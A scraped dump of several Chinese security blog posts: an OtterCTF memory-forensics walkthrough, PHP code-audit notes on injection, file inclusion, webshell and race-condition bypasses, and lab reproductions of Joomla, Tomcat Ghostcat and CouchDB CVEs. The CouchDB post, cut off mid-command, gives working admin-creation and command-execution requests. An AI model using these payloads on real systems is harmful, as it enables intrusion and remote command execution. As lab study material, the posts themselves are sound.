查看运行程序相关的记录，比如最后一次更新时间，运行过的次数等。volatility -f 文件名 --profile=系统 clipboard 查看剪贴板的信息volatility -f 文件名 --profile=系统 timeliner 最大程序提取信息volatility -f 文件名 --profile=系统 Dumpregistry 提取日志文件volatility -f 文件名 --profile=系统 dlllist 进程相关的dll文件列表 volatility -f 文件名 --profile=系统 memdump -p xxx --dump-dir=./ 提取进程volatility -f 文件名 --profile=系统 dumpfiles -Q 0xxxxxxxx -D ./ 提取文件volatility -f 文件名 --profile=系统 procdump -p pid -D ./ 转存可执行程序 volatility -f 文件名 --profile=系统 screenshot --dump-dir=./ 屏幕截图volatility -f 文件名 --profile=系统 hivedump -o 0xfffff8a001032410 查看注册表键名volatility -f 文件名 --profile=系统 printkey -K &quot;xxxxxxx&quot; 查看注册表键值 OtterCTF取证11题在分析之前，都需先查看当前镜像的信息，获取是哪个操作系统，使用imageinfo命令查看 然后使用volatility各类工具进行分析即可 获取密码volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 hashdump 查看用户名密码信息 volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 lsadump 查看用户强密码 使用john爆破密码不出密码尝试lsadump查看用户强密码 lsadump：从注册表中提取LSA密钥信息,显示加密以后的数据用户密码 pc的名称查看主机名 hivelist查看注册表信息，查看到system 所有用户信息都会存储到注册表，SYSTEM系统信息 hivelist查看注册表第一级信息 第一级只是目录，路径代表文件名 如果东西不多可以 hivedump 下来查看，如果很多可以用printkey一步步查看 所以文件的位置使用偏移量来表示，0x开头，使用 printkey打印出来，参数-o，然后根据得到的偏移量，找到系统注册表包含的值 volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 printkey -o 0xfffff8a000024010 继续寻找直到找到ComputerName关键词，后面的路径要使用 -K 参数使用一步步来，深入路径 含有目录两层\\ComputerName\\ComputerName，增加混淆 内存正在运行什么游戏，游戏连接哪个服务器游戏应该会连接服务器，所以查看网络 寻找可疑进程，连接外部网络的进程 volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 netscan 对所有网络连接进程扫描 账户登录过Lunar-3频道，账户名是什么寻找登录游戏频道的游戏账户名。 需要在游戏进程中查看，用户登录到进程中的话，那么内存应该有登录用户名 使用strings过滤可打印字符串，grep过滤含有关键字Lunar-3频道字符串 strings OtterCTF.vmem | grep Lunar-3 -A 5 -B 5 （-A 查看关键词前几行，-B查看关键词后几行，也可以使用-C查看前后几行） 都尝试一下发现是0tt3r8r33z3 strings命令在对象文件或二进制文件中查找可打印的字符串。 寻找登录名在0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} 后的游戏名 意思是用户名总在这个签名之后：0x64 0x??{6-8} 0x40 0x06 0x??{18} 0x5a 0x0c 0x00{2} 先将LunarMS.exe进程转存出来；-p pid号 volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 memdump -p 708 -D .&#x2F; 提取进程 可以使用010查看 5A 0C 00 片段 也可以使用：hexdump -C 708.dmp |grep “5a 0c 00” -C 3 寻找5a 0c 00 片段眼都快找花了，太多了 volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 yarascan -Y “&#x2F;\\x64(.{6,8})\\x40\\x06(.{18})\\x5a\\x0c\\x00\\x00&#x2F;i” -p 708 这个需要安装yarascan插件是最好找的 寻找经常复制粘贴的账号密码volatility -f OtterCTF.vmem –profile&#x3D;Win7SP1x64 clipboard clipboard 查看剪贴板的信息 寻找恶意软件名一般是使用pslist来查看进程寻找可疑进程名，但也有可能进程名进行了混淆分辨不出来或者被合法进程隐藏了 使用 pstree 命令可以查看进程树，可以查看所有进程和依赖关系 pstree代表查看带树结构的进程列表。 寻找可疑进程：通过寻找PPID大于PID的进程，或查看进程依赖寻找可疑的 这里mvware-tray.exe是ppid大于pid的并且很奇怪的是Rick And Morty的子进程 dlllist代表查看使用的动态链接库是否合法， 查看一下进程相关的dll文件列表 。-p指定pid号 发现是在temp目录下进行的，一看就不是正经程序， 因为temp这是一个临时目录 恶意软件是如何进入电脑的可以查看和恶意软件相关的文件 volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan 查看文件 直接查看文件太多，要加过滤，恶意进程的父进程是Rick And Morty volatility -f 1.vmem –profile&#x3D;Win7SP1x64 filescan | grep ‘Rick And Morty’ 三个种子文件和三个exe文件；寻找来源要关注种子文件，里面可能含有地址信息 volatility -f 1.vmem –profile&#x3D;Win7SP1x64 dumpfiles -Q 0xxxxxxxx -D .&#x2F; 查看文件内容 在这个文件里发现 website可疑，后面就是flag 恶意软件种子从哪来查看进程可以发现有很多chrome浏览器进程，种子可能是在浏览器中下载的 先把所有chrome进程转存下来 memdump -n chrome(指定所有chrome进程) -D .&#x2F; 再查找 download.exe.torrent 通过恶意软件寻找攻击者的比特币地址题目描述说攻击者在恶意勒索软件中留下了比特币地址，是多少呢？ 首先可以把恶意进程转存到一个可执行文件，使用IDA查看寻找比特币，钱包，支付等关键词，定位地点 也可以使用dnSpy进行逆向分析 也可以把转出的文件使用strings -e l 进行搜索 strings -e l 3720.dmp | grep -i -A 5 “ransomware” 恶意软件的图像的隐藏信息procdump 命令代表转存可执行程序 使用foremost分离图片 或者使用反编译查看图片","categories":[{"name":"取证","slug":"取证","permalink":"http://example.com/categories/%E5%8F%96%E8%AF%81/"}],"tags":[{"name":"volatility","slug":"volatility","permalink":"http://example.com/tags/volatility/"}]},{"title":"PHP代码审计","slug":"PHP代码审计","date":"2023-04-03T12:25:51.000Z","updated":"2023-04-03T13:21:12.906Z","comments":true,"path":"2023/04/03/PHP代码审计/","link":"","permalink":"http://example.com/2023/04/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"前言官方文档：php.netphp官方文档是非常详情，好用的，在遇到不清楚作用的函数时可以进行查询 白盒测试做代码审计最主要的知识是要去了解一个漏洞应该有哪些防御方式，因为大部分的漏洞都是因为修复没有做的全面，或者修复没有考虑到一些情况导致漏洞。MVC：C：分发处理请求网站的逻辑M：处理和数据库相关的操作V：显示给用户的内容 代码审计流程正向查找流程a. 从入口点函数出发（如index.php）b. 找到控制器，理解URL派发规则（URL具体映射到哪个具体的代码里）c. 跟踪控制器调用，以理解代码为目标进行源代码阅读d. 最终在阅读代码的过程和尝试中，可能发现漏洞 本质：程序员疏忽或逻辑问题导致漏洞 特点： 复杂：需要极其了解目标源码的功能与框架 跳跃性大：涉及M&#x2F;V&#x2F;C&#x2F;Service&#x2F;Dao等多个层面 漏洞的组合：通常是多个漏洞的组合，很可能存在逻辑相关的漏洞 反向查找流程a. 通过危险函数，回溯可能存在的漏洞 1. 查找可控变量 2. 传递的过程中触发漏洞 特点： 与上下文无关 危险函数，调用即漏洞 代码审计工具功能大多就是这个原理 双向查找流程（手动审计主要方式） 略读代码，了解框架（正向流程，如：网站都有哪些功能，什么样的架构如mvc：它的m在哪v,c在哪，用了什么模板引擎，是否用了orm（如果使用了ORM那么sql注入就很少了，如果没用是手工写的sql语句，可以关注是否存在sql漏洞）等…) 是否有全局过滤机制 有：是否可以绕过 可以：寻找漏洞触发点（反向查找流程，找危险函数） 不可以：寻找没有过滤的变量 没有：那么就看它具体是如何处理的,具体代码具体分析 有处理：寻找遗漏的处理点（如忘记处理的地方或者处理不太正确的地方） 完全没有处理：可以挖成筛子（很少） 3.找到了漏洞点，漏洞利用是否有坑 根源：理解程序执行过程，找寻危险逻辑特点： 高效：如挖隧道，双向开工，时间减半（不需要去完全理解网站内部原理和函数作用) 知识面广：需要同时掌握正向，反向挖掘技巧，并进行结合 以及所有正向，反向的优点 SQL注入漏洞挖掘技巧PHP+mysql链接方式有：mysql（废弃，但老的仍然有）mysqliPDO sql注入常见过滤方法intval： 把用户输入的数字后面的所有不是数字的都过滤掉addslashes： 把 ‘ 前加\\转义掉mysql_real_escape： 和第二个类似，但会考虑用户输入和mysql的编码，避免像宽字节注入问题 mysqli_escape_string &#x2F; mysqli_real_escape_string &#x2F; mysqli::escape_string （和mysqli搭配使用，和前面的功能类似）和他们的差别是会主动加引号包裹 PDO: quote 参数化查询 常见注入过滤绕过方法intval：不知道addslashes &#x2F; mysql_real_escape 1.宽字节注入 2.数字型sql语句 3.寻找字符串转换函数（传入编码好的字符绕过过滤，在后面被转换成sql语句） urldecode base64_decode iconv json_decode stripshasles simple_xml_loadstring例如：传入id被过滤但后面有一处代码是解码base64，所以我们可以传入 ‘ 的base64编码绕过 1234567&lt;?php$id = addslashes($_GET[&#x27;id&#x27;]);....$id = base64_decode($id);....$sql = &quot;select * from flag where id = &#x27;$id&#x27;&quot;; ?&gt; mysqli::escape_string &#x2F;&#x2F; PDO::quote 1.宽字节注入参数化查询 1.寻找非sql值的位置 开发者容易遗漏得输入点 HTTP头 a. X-Forwarded-For b. User-Agent c. Referer PHP_SELF（访问的页面url名，但用户可控） REQUEST_URI（用户请求得完整路径） 文件名 $_FILES[][name] php:&#x2F;&#x2F;input (post穿进去得内容) 引入单引号(转义符)的方法（’号被过滤，看后面有没有可以引入的地方） stripslashes base64_decode urldecode substr iconv str_replace(‘0’,’’,$sql) xml json_encode 任意文件操作PHP上传的文件会被保存在$_FILES下 PHP文件操作函数汇总 文件包含 include &#x2F; require &#x2F; include_once &#x2F; require_once &#x2F; spl_autoload 文件读取 file_get_contents &#x2F; fread &#x2F; readfile &#x2F; file &#x2F; highlight_file &#x2F; show_source 文件写入 file_put_contents &#x2F; fwrite &#x2F; mkdir &#x2F; fputs 文件删除 unlink &#x2F; rmdir 文件上传 move_uploaded_file &#x2F; copy &#x2F; rename 文件上传漏洞文件上传流程： 检查文件大小，后缀，类型 检查文件内容（如文件头，尾等） 提取文件后缀 生成新文件名 将上传临时文件拷贝到新文件名位置 文件上传逻辑常见错误 只检查文件类型不检查文件后缀 文件后缀黑名单有遗漏 使用原始文件名，导致\\0截断（一般没有了） 前端检验 文件包含漏洞首先明确一点，文件包含漏洞不等于文件读取漏洞 危害：文件读取 &#x2F; 代码执行常见位置：模板文件名（切换模板） 语言文件名（切换语言）常见利用： 要寻找可被包含利用的文件：上传文件，临时文件，Session文件，日志文件 后缀无法控制的情况：\\0截断，协议利用 PHP5.3.4+ 对包含\\0的文件操作函数进行了限制，基本上没有了 案例Metinfo 5.3.10版本Getshell漏洞可控制的部分：include $file . ‘.php’;http协议利用：http://xxxx.com/1.php (远程文件包含，一般不开设置不能用)PHP协议利用：zip&#x2F;phar 制作2.php的压缩包 -&gt; 2.zip -&gt; 改后缀为 -&gt; 2.jpg 在服务器中上传2.jpg文件 再利用：zip:&#x2F;&#x2F;var&#x2F;www&#x2F;upload&#x2F;head&#x2F;2.jpg#2.php （#意思是访问zip内部的子文件-&gt;2.php） 文件删除漏洞危害： 删除服务器任意文件，DOS服务器 删除安装锁文件，导致目标环境可被重新安装 重新安装 -》任意重置管理员密码 案例上传新头像会把老头像自动删除，但可以把删除老图像的地址换成别的造成任意文件删除 命令执行命令执行指的是执行系统命令 （ls）https://explainshell.com/可以在这个网站查询复杂命令的意思代码执行指的是PHP的代码执行本质：用户输入无过滤，拼接到了系统命令中PHP命令执行函数： system passthru exec shell_exec popen (常见的就是上面这5种) proc_open pcntl_exec dl 要像命令执行很难，要先学会如何正确防御命令注入，才能分辨出哪些没有正确处理 防御PHP命令注入漏洞：PHP中只能使用escapeshellcmd和escapeshellatg进行命令参数的过滤 先区分这2个函数： ​ escapeshellcmd​ escapeshellatg​ escapeshellatg没问题但escapeshellatg是只能限制逃逸不出单引号’但有些命令的不常用参数是可以任意命令执行 要把用户的输入放在值里 ​ 如果把输入直接是键值对可能会造成漏洞 1grep &#123;$query&#125; 有一些命令的不常用参数可能会导致一些意外发生。直接使用 | 等命令跳出前面的命令实现命令执行​ 修复： 12grep -i &#123;$query&#125;grep -- &#123;$query&#125; XML实体注入漏洞PHP XML解析函数 simplexml_load_file simplexml_load_string SimpleXMLElement DOMDocument xml_parse如果发现有这几个函数的地方，基本上可以确定百分之80有xml实体注入 libxml_disable_entity_loader(true)来禁用掉外部实体的加载，就不存在xml实体注入 PHP中XXE漏洞逐渐减少，到现在的版本里几乎已经绝迹了，因为PHP XML操作依赖libxml库但在libxml2.9.0+默认是关闭了xml外部实体解析开关的，可以顺势挖一下也比较简单 方法：暴力搜索就行，查看有没有xml解析函数，再看禁没禁止外部加载 无输出点的xxe漏洞：有时候可能存在xxe漏洞但并不会在页面中显示，要利用到blind-xxeBlind XXE原理： 利用XML外部实体功能读取文件 利用XML外部实体功能发送HTTP请求 利用HTTP协议传递文件内容 前端漏洞建议代码审计不去主要找这种漏洞，进行黑盒测试就能挖到的漏洞，在代码审计过程中没必要太注重 百盒测试中可以关注前端漏洞类型： XSS漏洞 CSRF漏洞 Jsonp劫持漏洞（前面三个关注多） URL跳转漏洞（不多） 点击劫持漏洞（不多） xss在白盒测试中寻找XSS漏洞：常见防护方法： htmlspecialchars()把用户输入转义成html实体字符（这时候是绝对没有xss的） strip_tags() 从字符中去除HTML和PHP标记 自动化FUZZ -》寻找输出函数（危险函数）富文本XSS挖掘 什么是富文本：本质就是html，网站给你一个有很多功能的输入框 为什么出现富文本xss： 前面2种防护方法要么就是转义掉要么就是直接去除掉，但在一些写文章，或者发帖的需要提交html富文本，如果使用前面的方法那么提交的就不是富文本了，会影响业务。常见富文本过滤方法： 会使用富文本的xss过滤器：把用户输入的恶意标签，属性去掉 黑名单（很难过滤掉该过滤的标签属性) 白名单 CSRF在白盒测试中寻找CSRF漏洞： 检查Referer（来自于当前域名，可信域名，才会执行） （可以看正则匹配全面吗，比如正则匹配xxx.nte后缀的域名，那么可以注册个cxxx.nte域名绕过） 检查Token （寻找跨域漏洞，要去跨域请求某一个网站内容的时候需要先去请求这个网站有没有crossdomain.xml， 要根据这里面配置的信息来认证是否允许用户去发送一个跨站的请求） Flash Jsonp CORS 黑盒测试就可以找到这三个 Jsonp劫持漏洞在白盒测试中寻找Jsonp劫持漏洞：Jsonp介绍：Jsonp是 json 的一种”使用模式” 可以让网页从别的域名（网站）那获取资料，即跨域读取数据；它利用的是script标签的 src 属性不受同源策略影响的特性，使网页可以得到从其他来源动态产生的 json 数据，因此可以用来实现跨域读取数据。更通俗的说法：JSONP 就是利用 标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。 原理：当网站通过 JSONP 方式传递用户敏感信息时，攻击者可以伪造 JSONP 调用页面，诱导被攻击者访问来 达到窃取用户信息的目的；jsonp 数据劫持就是攻击者获取了本应该传给网站其他接口的数据。 和 CSRF 类似，都需要用户交互，而 CSRF 主要是以用户的账户进行增删改的操作，jsonp 则主要用来劫持数据。 Jsonp借此漏洞常见位置： web框架默认支持ajax + jsonp方式请求 程序员主动开发需要支持jsonp的应用Jsonp劫持防御： Referer检查 Toke 反序列化漏洞几乎所有语言都有序列化功能，java，php，python都有相关漏洞反序列化分类： 反序列化触发执行任意代码 -》python (python的反序列化其实是一门真正的语言，是可以直接进行执行代码的) 反序列化后，通过已有代码利用链，间接执行任意代码 -》 PHP/java PHP反序列化注意函数： serialize（序列化函数） unserialize（反序列化函数）PHP反序列化特点： 引入除资源型外任意类型变量 无法引入函数 -》不能直接执行代码 迂回战术 寻找程序中可能存在的漏洞的类 实例化类对象 -》 触发漏洞 漏洞挖掘过程： 寻找调用反序列化函数的位置 寻找包含危险方法的类 反序列化上下文是否包含该类 包含：直接生成该类，触发漏洞 不包含：寻找引用链怎么利用链，怎么构造利用语句，还有phar反序列化等有很多后面再写如果只是要找反序列化漏洞，那么找unserialize就够了 小技巧篇代码审计明白了原理，明白了各种漏洞的修复方式，之后想要提高就要仰仗自己积累的一些小技巧因为你会发现遇到的大部分有漏洞的代码前面都存在一些过滤，检查；如果你知道一些技巧后会发现很多过滤，检查都是可以绕过的 web开发框架下的PHP漏洞LaravelsymfonyslimphpYii2特点： 所需PHP版本较高，\\0截断等老漏洞绝迹 提供功能强大的ORM（即使想写出一个sql漏洞都难） 提供自动处理输出的模板引擎（想写出前端漏洞都难了，因为自带一些转义，实体化功能） 开发者可以通过composer找到任何需要的功能类，避免因为自己造轮子产生的漏洞现代web开发框架安全思想 Secure by default 原则 文档中，会详细叙述可能出现的安全问题挖掘思路 寻找框架本身的安全漏洞 寻找不规范的开发方式 寻找错误的配置（debug模式，日志记录等） 异常的利用（如果开启了debug或者会输出异常，可以构造异常抛出敏感信息，新的框架特有的漏洞老的几乎没有）第三方服务利用 spl_autoload的利用 压缩包问题web应用执行了解压缩操作黑客利用压缩包的一些特性，构造\"畸形\"压缩包解压缩时将造成漏洞 压缩炸弹惯用的方式 绕过文件检查失败后的删除操作 阻止压缩时的文件检查 绕过压缩时的文件检查 链接文件的利用绕过文件检查失败后的删除操作： 案例：上传压缩包后，后端处理只能删除文件无法删除目录，导致shell 阻止压缩时的文件检查 案例：压缩包解压失败，程序抛出错误并停止运行 -》 webshell保留 压缩包三个文件，一个正常图片，一个webshell，第三个文件压缩存在错误绕过压缩时的文件检查 案例：使用../解压到上层目录，；构造一个文件名为：../../webshell.php，会让后端解压到上层目录 而删除文件一般是在当前目录递归删除非法文件，不可能在根目录递归链接文件的利用 后端解压后未判断文件类型，导致可以上传软链接文件，该软连接导致任意文件读取 压缩包是允许压缩软连接文件，也运行解压软连接文件；但文件上传传不了 条件竞争漏洞条件竞争：web服务器都是多线程的，同时运行多人访问网站，理论是互相不影响的，但是php，Apache，Nginx只能保证php是不互相影响的，不能保证文件或者数据库链接是不互相影响的 条件竞争漏洞挖掘方向： 上传后删除的利用 忘记上锁的数据库 鸡肋文件包含的妙用上传后删除的利用： 上传压缩包后解压递归删除非法文件，但在这个过程中开启多个线程去访问解压出来的webshell，并在上层目录写入新的webshell；打一个时间差，在还没删除时利用，把webshell解压出来后面还有其他文件发现一个文件上传的逻辑是在上传了后再删除，基本上就确定存在条件竞争漏洞 没上锁的数据库案例：商场漏洞： 1.查询用户余额 2.查询购买商品的价格 3.判断用户余额>商品价格 4.用户余额=用户余额 - 价格 如果第三步和第四步是单独的步骤，如果用多个线程去请求同时走到了第三步，判断都可以购买 购买完后同时走到第四步后同时减去价格，就会导致余额变负 -》成功购买多个商品 临时文件包含利用​ 文件包含漏洞需要找到一个能够包含的恶意文件，但网站没有能够上传文件的地方，也没有找到任何可以控制的文件 ​ 寻找临时文件泄露点，文件上传的时候，用户会发送一个数据包给服务器，服务器会将数据包里的文件保存到当前的临时目录下，变成 临时文件，文件名随机，内容可以控制，phpinfo可以获取文件名​ 我们可以上传一个非常大的文件，需要10秒上传完成，临时文件上传完成后是会被删除的，再开多个线程去包含该文件，生成一个新的webshell 一些容易犯错的点header('404') 会给用户返回一个页面，但并不会阻止php解释器继续往下运行 正则：应该要写判断只有的，错误写成包含有，那么就有漏洞 12345if(!preg_match(&#x27;/Ghost|Know/i&#x27;, $cmd))&#123; exit(&quot;错误&quot;)；&#125;cmd = union select 1,2,3 # Ghostcmd = ls / | ban 它会查询传入的语句其实有DESC就绕过了但和DESC一块的有我们的其他命令 尝试审计代码admin 后台管理目录install 网站的安装目录api 接口文件目录data 系统处理数据相关目录include 用来包含的全局文件template 模板css CSS样式表目录images 系统图片存放目录system 管理目录函数集文件: 这类文件通常命名中包含functions或者common等关键字，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到它们，寻找这些文件一个非常好用的技巧就是去打开index.php或者一些功能性文件，在头部一般都能找到。配置文件：这类文件通常命名里面包括config这个关键字，配置文件包括Web程序运行必须的功能性配置选项以及数据库等配置信息，从这个文件里面可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数值是用单引号还是用的双引号包起来，如果是双引号，则很大可能会存在代码执行漏洞。https://github.com/source-trace/bluecms根据流程填完信息后又空白了，但没问题已经安装好了，访问index.php页面就好使用Seay工具自动扫描一下 先看第一个试试可以看到先是包含了一个common.inc.php的文件，其次如果有ad_id参数那么会经过trim函数的处理再sql语句拼接时是没有单引号包裹的，可能存在问题去看看包含的php文件。粗略的观察一下发现有对于$_GET进行处理if(!get_magic_quotes_gpc())，查看下函数意思:始终返回false就是一直是true，都会经过这个if语句里的处理；if语句的处理追踪一下deep_addslashes看看就是经过了addslashes的处理，再前面学习过这个函数就是对于单引号双引号反斜线和nul进行转义，但我们sql语句并没有被''单引号包裹，这个过滤对于要审计的sql语句没有用；希望+1看完包含的函数后在看一下trim函数有没有问题基本上就确定有没有sql注入了么有定位到这个函数，查下官方手册发现是用来去除字符串首尾处的空白字符（或者其他字符）\\t \\n \\r \\0 \\x0B但只是去除首位的，语句中间的并不会，所以没影响；好理论确定存在注入了，实践开始没有过滤扫描sql语句或者字母数字什么的，所以直接使用order查看下字段数可以看到查到8时报错并有返回说明确实存在注入，使用联合注入试下它是无回显的，可能要使用到时间盲注了，但在查看到网页源代码时发现是有回显的，位数在7，在尝试查下表，嗯看来什么都可以查到没有单引号，尝试下xss注入；也是存在的","categories":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/categories/PHP/"}],"tags":[{"name":"PHP代码审计","slug":"PHP代码审计","permalink":"http://example.com/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Joomla 未授权访问漏洞POC CVE-2023-23752","slug":"Joomla-未授权访问漏洞POC-CVE-2023-23752","date":"2023-04-02T13:03:46.000Z","updated":"2023-04-02T13:13:21.711Z","comments":true,"path":"2023/04/02/Joomla-未授权访问漏洞POC-CVE-2023-23752/","link":"","permalink":"http://example.com/2023/04/02/Joomla-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9EPOC-CVE-2023-23752/","excerpt":"","text":"前言Joomla是一套全球知名的内容管理系统（CMS），其使用PHP语言加上MySQL数据库所开发，可以在Linux、Windows、MacOSX等各种不同的平台上运行。 2月16日，Joomla官方发布安全公告，修复了Joomla! CMS中的一个未授权访问漏洞（CVE-2023-23752），目前该漏洞的细节及PoC&#x2F;EXP已公开。 Joomla! CMS 版本4.0.0 - 4.2.7中由于对web 服务端点访问限制不当，可能导致未授权访问Rest API，造成敏感信息泄露（如数据库账号密码等）。 影响版本Joomla! CMS 版本4.0.0 - 4.2.7 pocPOC获取：https://github.com/GhostToKnow/CVE-2023-23752 自己写了个poc测试了下，1k条数据40s左右扫描完毕，结果正确率在90%以上 linux: ![image-20230309135227943](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-21.png) win: ![image-20230309135344844](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-41.png) ![image-20230309135128326](C:\\Users\\dong\\Desktop\\Books\\CVE\\Joomla CVE-2023-23752\\Snipaste_2023-04-02_21-05-58.png) 修复建议目前该漏洞已经修复，受影响用户可及时升级到Joomla! CMS 版本4.2.8。","categories":[{"name":"POC","slug":"POC","permalink":"http://example.com/categories/POC/"}],"tags":[{"name":"Joomla","slug":"Joomla","permalink":"http://example.com/tags/Joomla/"}]},{"title":"Tomcat 幽灵猫任意文件读取漏洞复现 CVE-2020-1938","slug":"Tomcat-幽灵猫任意文件读取漏洞复现-CVE-2020-1938","date":"2023-04-02T12:53:03.000Z","updated":"2023-04-02T12:55:44.218Z","comments":true,"path":"2023/04/02/Tomcat-幽灵猫任意文件读取漏洞复现-CVE-2020-1938/","link":"","permalink":"http://example.com/2023/04/02/Tomcat-%E5%B9%BD%E7%81%B5%E7%8C%AB%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-1938/","excerpt":"","text":"Tomcat 任意文件读取漏洞复现 CVE-2020-1938漏洞介绍1231. Java是目前Web开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。2. CVE-2020-1938是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。3. 这个漏洞影响全版本默认配置下的 Tomcat（在我们发现此漏洞的时候，确认其影响 Tomcat 9/8/7/6 全版本，而年代过于久远的更早的版本未进行验证），这意味着它在 Tomcat 里已经潜伏了长达十多年的时间。 影响版本 Apache Tomcat &#x3D; 6 7 &lt;&#x3D; Apache Tomcat &lt; 7.0.100 8 &lt;&#x3D; Apache Tomcat &lt; 8.5.51 9 &lt;&#x3D; Apache Tomcat &lt; 9.0.31 漏洞复现创建文件夹 1mkdir tomcat-ghostcat 进入创建好的文件夹 1cd tomcat-ghostcat 拉取靶场启动脚本 1wget repo.vulab.io/tomcat/CVE-2020-1938/1.0.1 -O tomcat-ghostcat 启动漏洞docker容器 1sudo docker-compose -f tomcat-ghostcat up 在本机访问192.168.52.130访问开启的web服务，这里我配置了hosts 可以看到CVE-2020-1938已经成功载入，使用namp扫描一下端口 1sudo nmap -v -sS -p1-9000 -Pn -T4 -A 192.168.52.130 --script http-methods --script-args Gecko/20100101 Firefox/87.0&quot; 发现服务器开启了8009端口，ajp协议端口就是8009端口，可能存在ajp协议，使用xray工具扫描下端口 1xray_windows_386.exe servicescan --target 192.168.52.130:8009 爆出了存在幽灵猫漏洞的CVE-2022-1938漏洞，使用相关poc测试发现成功拉取到文件 漏洞修复更新tomcat版本，将tomcat升级到9.0.31、8.5.51或者7.0.100版本 禁止使用AJP协议 配置secret和secretRequired来设置AJP协议的认证凭证 参考xray 1https://www.chaitin.cn/en/ghostcat#download CNVD-2020-10487-Tomcat-Ajp-lfi 1https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"}]},{"title":"CouchDB 垂直权限绕过任意命令执行漏洞复现 CVE-2017-12635/6","slug":"CouchDB-垂直权限绕过任意命令执行漏洞复现-CVE-2017-12635-6","date":"2023-04-02T12:34:42.000Z","updated":"2023-04-02T12:43:57.381Z","comments":true,"path":"2023/04/02/CouchDB-垂直权限绕过任意命令执行漏洞复现-CVE-2017-12635-6/","link":"","permalink":"http://example.com/2023/04/02/CouchDB-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-12635-6/","excerpt":"","text":"前言CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。 CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 影响版本： ​ 小于 1.7.0 以及小于 2.1.1 漏洞复现环境搭建使用Vulhub的漏洞平台进行复现 docker-compose up -d 访问http://192.168.52.128:5984/_utils/#login出现如下页面搭建成功 测试过程CVE-2017-12635构造创建账户的PUT包 123456789101112131415PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1Host: www.0-sec.org:5984Accept: /Accept-Language: enUser-Agent: Connection: closeContent-Type: application/jsonContent-Length: 104 &#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;GhostToKnow&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;password&quot;: &quot;GhostToKnow&quot; &#125; 我们没有admin权限，所以报错forbidden显示只有管理员才能设置Role角色。 绕过role验证：发送包含两个roles的数据包，即可绕过限制 在原先的包中加入 “roles”:[], 12345678910111213141516PUT /_users/org.couchdb.user:GhostToKnow HTTP/1.1Host: www.0-sec.org:5984Accept: /Accept-Language: enUser-Agent: Connection: closeContent-Type: application/jsonContent-Length: 104 &#123; &quot;type&quot;: &quot;user&quot;, &quot;name&quot;: &quot;GhostToKnow&quot;, &quot;roles&quot;: [&quot;_admin&quot;], &quot;roles&quot;: [], &quot;password&quot;: &quot;GhostToKnow&quot; &#125; 返回”ok”:true即成功创建用户 尝试使用GhostToKnow&#x2F;GhostToKnow登录： 成功登录，且为管理员账户 CVE-2017-12636该漏洞利用条件需要登录管理员用户触发，可使用上面介绍的CVE-2017-12635搭配利用 由于Couchdb 2.x和和1.x的的API接口有所差别，导致利用方式也不同，这里直接拿刚刚复现的CVE-2017-12635环境，演示2.x版本 Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name,带上账号密码访问/_membership获取node名称： 其中GhostToKnow:GhostToKnow为管理员的账户密码 curl http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_membership 这里只有一个node，为：nonode@nohost 修改nonode@nohost的配置,其中id &gt;/tmp/success是要执行的命令，可以更换为弹shell 1curl -X PUT http://GhostToKnow:GhostToKnow@192.168.52.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#x27;&quot;id &gt;/tmp/success&quot;&#x27; 请求添加一个名为ccc的Database，以便在里面执行查询 curl -X PUT &#39;http://GhostToKnow:GhostToKnow@192.168.52.128:5984/ccc&#39; 请求添加一个名为test的Document，以便在里面执行查询 curl -X PUT 